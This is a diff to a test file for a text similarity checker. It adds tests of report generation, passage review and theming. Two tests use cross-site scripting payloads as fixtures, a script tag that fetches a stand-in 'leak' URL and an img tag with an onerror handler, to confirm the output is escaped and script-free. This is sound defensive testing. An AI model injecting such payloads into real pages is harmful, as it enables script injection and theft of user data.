@@ -18,12 +18,15 @@ const files = Object.freeze({
   engine: "src/lib/similarity/engine.ts",
   input: "src/lib/similarity/input.ts",
   report: "src/lib/similarity/report.ts",
+  review: "src/lib/similarity/review.ts",
   samples: "src/lib/similarity/samples.ts",
   worker: "src/lib/similarity/worker.ts",
   highlights: "src/app/tools/plagiarism-checker/text-highlights.tsx",
   client: "src/app/tools/plagiarism-checker/plagiarism-tool.tsx",
   page: "src/app/tools/plagiarism-checker/page.tsx",
   og: "src/app/tools/plagiarism-checker/opengraph-image.tsx",
+  css: "src/app/tools/plagiarism-checker/similarity.css",
+  theme: "src/app/globals.css",
   api: "src/app/api/ai-plagiarism-check/route.ts",
   seo: "src/lib/tool-seo.tsx",
   config: "src/lib/config.ts",
@@ -157,7 +160,8 @@ function createRuntime({ allowUrls = true, tracked = true } = {}) {
     engine: { "./types": "types" },
     input: { "./engine": "engine", "./types": "types" },
     report: {},
-    highlights: { react: React, "react/jsx-runtime": jsxRuntime },
+    review: {},
+    highlights: { react: React, "react/jsx-runtime": jsxRuntime, "@/lib/similarity/review": "review" },
     seo: {
       "react/jsx-runtime": jsxRuntime,
       // Read the production fallback as an AST literal; never evaluate app config/env.
@@ -203,8 +207,9 @@ const runtime = createRuntime();
 const { inputProblem, readTextFile, manualSearchUrl } = runtime.load("input");
 const engine = runtime.load("engine");
 const { SIMILARITY_LIMITS: limits, DEFAULT_MATCH_OPTIONS } = runtime.load("types");
-const { buildComparisonReport, formatCoverage, REVIEW_LABELS } = runtime.load("report");
-const { TextHighlights } = runtime.load("highlights");
+const { buildComparisonHtmlReport, buildComparisonReport, formatCoverage, REVIEW_LABELS } = runtime.load("report");
+const { selectPassages, passageContext } = runtime.load("review");
+const { PassageContext, TextHighlights } = runtime.load("highlights");
 const options = Object.freeze({ ...DEFAULT_MATCH_OPTIONS, minWords: 4 });
 const supplied = (text, index = 0, label = `Source ${index + 1}`) => ({ id: `fixture-${index + 1}`, label, text });
 const compareSnapshot = (draft, texts, settings = {}, reviews = {}) => {
@@ -753,7 +758,7 @@ const falseClaims = /100%\s+private|\bunlimited\b|under a second|Verify Text Ori
 test("actual page metadata keeps the absolute title, production canonical and specific social image", (t) => {
   const { metadata } = pageModule;
   assert.deepEqual(plain(metadata.title), { absolute: toolConfig.title });
-  assert.equal(metadata.title.absolute, "Free Text Similarity Checker - Compare Sources");
+  assert.equal(metadata.title.absolute, "Text Similarity Checker - Compare Two Texts Free");
   assert.equal(metadata.description, toolConfig.description);
   assert.equal(metadata.alternates.canonical, canonical);
   assert.equal(metadata.openGraph.url, canonical);
@@ -826,11 +831,11 @@ test("actual visible page explains no external corpus, no originality verdict, d
 });
 
 test("new client contains no retired AI endpoint or network calls, and retains explicit manual-search preview", () => {
-  const allowedImports = new Set(["react", "lucide-react", "@/lib/similarity/engine", "@/lib/similarity/input", "@/lib/similarity/report", "@/lib/similarity/samples", "@/lib/similarity/types", "./text-highlights", "./similarity.css"]);
+  const allowedImports = new Set(["react", "lucide-react", "@/lib/similarity/engine", "@/lib/similarity/input", "@/lib/similarity/report", "@/lib/similarity/review", "@/lib/similarity/samples", "@/lib/similarity/types", "./text-highlights", "./similarity.css"]);
   for (const declaration of findNodes(tree("client"), ts.isImportDeclaration)) {
     assert.ok(allowedImports.has(declaration.moduleSpecifier.text), `Unexpected client import: ${declaration.moduleSpecifier.text}`);
   }
-  for (const name of ["client", "engine", "input", "report", "types", "samples", "worker", "highlights"]) {
+  for (const name of ["client", "engine", "input", "report", "review", "types", "samples", "worker", "highlights"]) {
     assert.doesNotMatch(source(name), /ai-plagiarism/i);
     const calls = findNodes(tree(name), (node) => ts.isCallExpression(node) || ts.isNewExpression(node));
     for (const call of calls) {
@@ -925,3 +930,138 @@ for (const name of ["catalog", "home", "llms", "chat"]) {
     assert.ok(!runtime.cache.has(name), "Discovery routes must never be executed");
   });
 }
+
+test("reports include the complete eligible overlap partition and per-source counts", () => {
+  const snapshot = compareSnapshot("a b c d e f g h i j extra", ["a b c d e f", "e f g h i j"]);
+  const report = buildComparisonReport(freeze(snapshot), false);
+  for (const text of [
+    "Matched in exactly one supplied source: 8 words",
+    "Matched in multiple supplied sources: 2 words",
+    "No qualifying match in supplied sources: 1 eligible words",
+    "Matched only in this source: 4 document words",
+    "Also matched in other supplied sources: 2 document words",
+  ]) includeLine(report, text);
+  assert.match(report, /not the whole web/);
+  assert.match(report, /does not identify an original author/);
+});
+
+test("HTML report escapes hostile evidence and is self-contained and script-free", () => {
+  const label = '</pre><script>fetch("https://example.invalid/leak")</script>';
+  const snapshot = compareSnapshot("alpha beta gamma delta", [supplied("alpha beta gamma delta", 0, label)]);
+  snapshot.reviews[snapshot.result.sources[0].passages[0].id] = { status: "revise", note: '<img src="https://example.invalid/pixel" onerror="alert(1)"> & "quoted"' };
+  const frozen = freeze(snapshot);
+  const html = buildComparisonHtmlReport(frozen, true);
+  const parsed = parseDocument(html);
+  const report = elements(parsed, (node) => node.name === "pre");
+  assert.equal(report.length, 1);
+  assert.equal(textContent(report[0]), buildComparisonReport(frozen, true));
+  assert.equal(elements(parsed, (node) => ["script", "img", "iframe", "link", "object", "embed", "form", "a"].includes(node.name)).length, 0);
+  for (const node of elements(parsed)) assert(!Object.keys(node.attribs ?? {}).some((key) => /^on/i.test(key)));
+  const csp = elements(parsed, (node) => node.name === "meta" && node.attribs["http-equiv"] === "Content-Security-Policy")[0].attribs.content;
+  assert.match(csp, /default-src 'none'/); assert.match(csp, /form-action 'none'/);
+  assert.match(html, /@media print/); assert.doesNotMatch(html, /window\.print|http-equiv="refresh"/);
+  assert.equal(buildComparisonHtmlReport(frozen, true), html);
+});
+
+test("HTML stats-only and compact reports omit labels, passages and private notes", () => {
+  const redacted = buildComparisonHtmlReport(freeze(privateSnapshot()), false);
+  for (const value of ["LABEL_ONLY", "NOTE_ONLY", "draftTailOnly", "sourceTailOnly"]) assert(!redacted.includes(value));
+  const draft = Array(10_000).fill("alpha").join(" ");
+  const excerpt = Array(9_851).fill("alpha").join(" ");
+  const large = buildComparisonHtmlReport(compareSnapshot(draft, Array(5).fill(excerpt)), true);
+  assert(large.length < 350_000); assert(!large.includes("alpha alpha")); assert.match(large, /TEXT BUDGET/);
+});
+
+test("HTML report supports repeated sentences and unavailable coverage without numeric verdicts", () => {
+  const repeat = buildComparisonHtmlReport(repeatSnapshot("alpha beta gamma delta. alpha beta gamma delta."), true);
+  assert.match(repeat, /1 repeated sentence groups/); assert.doesNotMatch(repeat, /originality score:\s*\d/i);
+  const excluded = compareSnapshot('"alpha beta gamma delta"', ['"alpha beta gamma delta"'], { excludeQuotes: true });
+  assert.match(buildComparisonHtmlReport(excluded, false), /N\/A matched-document coverage/);
+});
+
+const orderedFixture = () => [
+  { id: "late", sourceId: "b", draft: { start: 40, end: 90 }, source: { start: 0, end: 50 }, words: 8 },
+  { id: "early", sourceId: "a", draft: { start: 0, end: 25 }, source: { start: 0, end: 25 }, words: 4 },
+  { id: "middle", sourceId: "b", draft: { start: 20, end: 100 }, source: { start: 0, end: 80 }, words: 12 },
+];
+test("passage order is deterministic and never mutates the source evidence", () => {
+  const passages = freeze(orderedFixture());
+  const order = (value) => Array.from(selectPassages(passages, {}, ["a", "b"], "all", "all", value), (item) => item.id);
+  assert.deepEqual(order("document"), ["early", "middle", "late"]);
+  assert.deepEqual(order("longest"), ["middle", "late", "early"]);
+  assert.deepEqual(order("source"), ["early", "middle", "late"]);
+  assert.deepEqual(plain(passages), orderedFixture());
+});
+
+test("all review statuses can be combined with a source filter without changing coverage", () => {
+  const snapshot = compareSnapshot("a b c d e f g h i j", ["a b c d e f", "e f g h i j"]);
+  const passages = snapshot.result.sources.flatMap((item) => item.passages);
+  const before = plain(snapshot.result);
+  const id = passages[0].id;
+  for (const status of Object.keys(REVIEW_LABELS)) {
+    const reviews = { [id]: { status, note: "review only" } };
+    const selected = selectPassages(passages, reviews, snapshot.sources.map((item) => item.id), passages[0].sourceId, status, "document");
+    assert.equal(selected.length, 1); assert.equal(selected[0].id, id);
+    assert.equal(selectPassages(passages, reviews, ["missing"], "missing", status, "longest").length, 0);
+  }
+  assert.deepEqual(plain(snapshot.result), before);
+});
+
+test("focused context preserves original text within its bounds", () => {
+  const text = "Before: alpha beta gamma delta. After.";
+  const start = text.indexOf("alpha"), end = text.indexOf(". After");
+  const context = passageContext(text, { start, end });
+  assert.equal(context.before + context.match + context.after, text);
+  assert.equal(context.match, "alpha beta gamma delta");
+  assert.equal(context.shortened, false); assert.equal(context.leading, false); assert.equal(context.trailing, false);
+});
+
+test("focused context bounds giant passages and keeps valid UTF-16 boundary pairs", () => {
+  const text = `${"🧪".repeat(80)}alpha ${"🧪".repeat(800)} delta${"🧪".repeat(80)}`;
+  const range = { start: 160, end: text.length - 160 };
+  const context = passageContext(text, range);
+  assert(context.before.length <= 140); assert(context.after.length <= 140); assert(context.match.length <= 1200);
+  assert.equal(context.shortened, true); assert.equal(context.leading, true); assert.equal(context.trailing, true);
+  for (const value of [context.before, context.match, context.after]) assert.equal(value.isWellFormed(), true);
+  for (const invalid of [{ start: -1, end: 5 }, { start: 4, end: 3 }, { start: 0, end: text.length + 1 }, { start: 0.5, end: 3 }]) {
+    assert.throws(() => passageContext(text, invalid), /outside the document/);
+  }
+});
+
+test("focused-context component renders malicious markup only as literal text", () => {
+  const text = '<img src="https://example.invalid/test"> alpha beta gamma delta </script>';
+  const range = { start: text.indexOf("alpha"), end: text.indexOf(" </script>") };
+  const html = renderToStaticMarkup(React.createElement(PassageContext, { text, range, markerId: "context-current" }));
+  const parsed = parseDocument(html);
+  assert.equal(elements(parsed, (node) => ["img", "script", "iframe", "link"].includes(node.name)).length, 0);
+  assert.equal(textContent(elements(parsed, (node) => node.name === "p")[0]), text);
+  assert.equal(elements(parsed, (node) => node.attribs?.id === "context-current").length, 1);
+  assert.equal(textContent(elements(parsed, (node) => node.name === "mark")[0]), "alpha beta gamma delta");
+});
+
+test("landing page accurately explains review enhancements and print-to-PDF boundaries", () => {
+  for (const pattern of [/exactly one supplied source/, /multiple supplied sources/, /Duplicate source entries count separately/, /8 \+ 4 \+ 28 = 40/, /first 20 qualifying occurrences/, /Focused context/, /not a direct PDF download/, /without scripts or external resources/, /not just the passages currently visible/]) assert.match(visiblePage, pattern);
+  assert.equal(elements(pageDom, (node) => hasClass(node, "sim-use-case")).length, 3);
+});
+
+test("tool inherits ByteVerse theme tokens instead of an independent green palette", () => {
+  const css = source("css");
+  for (const [local, shared] of [["accent", "primary"], ["ink", "foreground"], ["border", "border"], ["surface", "card"], ["soft", "muted"], ["muted", "muted-foreground"]]) {
+    assert(css.includes(`--sim-${local}:var(--${shared})`));
+  }
+  assert.match(css, /color:var\(--primary-foreground\)/);
+  assert.doesNotMatch(source("page"), /emerald-|teal-|green-|#173f38|#f4f8f3/);
+  assert.doesNotMatch(css, /#(?:136853|123c34|153b30|dcf7ed|173f38|102d28|184e3d|329275|bcdfad)\b/i);
+  const rootTokens = source("theme").match(/:root\s*\{([\s\S]*?)\}/)?.[1];
+  const darkTokens = source("theme").match(/\.dark\s*\{([\s\S]*?)\}/)?.[1];
+  assert(rootTokens && darkTokens);
+  const color = (tokens, name) => tokens.match(new RegExp(`--${name}:\\s*(#[0-9a-f]+);`, "i"))?.[1];
+  for (const name of ["primary", "foreground", "card", "border", "muted-foreground"]) {
+    const value = color(rootTokens, name);
+    assert(value, `Missing shared token: ${name}`);
+    assert(source("report").includes(value), `Printable report differs from site ${name}`);
+  }
+  for (const name of ["background", "foreground", "card", "border", "accent"]) {
+    assert(source("og").includes(color(darkTokens, name)), `Social image differs from site dark ${name}`);
+  }
+});
